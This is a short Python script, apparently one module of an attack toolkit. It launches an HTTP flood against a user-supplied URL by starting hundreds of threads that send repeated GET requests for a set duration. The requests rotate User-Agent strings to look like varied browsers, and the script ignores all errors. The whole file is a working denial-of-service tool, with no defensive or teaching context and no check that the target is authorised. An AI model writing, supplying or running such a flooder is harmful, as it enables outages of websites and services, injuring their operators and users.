#!/usr/bin/env python3
# HTTP Flood Attack Module

import requests, random, time, threading

def run():
    print("\n" + "="*60)
    print("HTTP FLOOD")
    print("="*60)
    
    url = input("Target URL: ").strip()
    if not url.startswith('http'):
        url = f"http://{url}"
    
    threads = int(input("Threads [200]: ").strip() or "200")
    duration = int(input("Duration (seconds) [60]: ").strip() or "60")
    
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
    ]
    
    stop_event = threading.Event()
    
    def flood():
        end_time = time.time() + duration
        while time.time() < end_time and not stop_event.is_set():
            try:
                headers = {'User-Agent': random.choice(user_agents)}
                requests.get(url, headers=headers, timeout=2)
            except:
                pass
    
    print(f"\nStarting HTTP Flood on {url}")
    print(f"Threads: {threads} | Duration: {duration}s")
    
    for i in range(threads):
        threading.Thread(target=flood, daemon=True).start()
    
    try:
        time.sleep(duration)
        stop_event.set()
        print("\nHTTP Flood completed!")
    except KeyboardInterrupt:
        stop_event.set()
        print("\nStopped by user")

if __name__ == "__main__":
    run()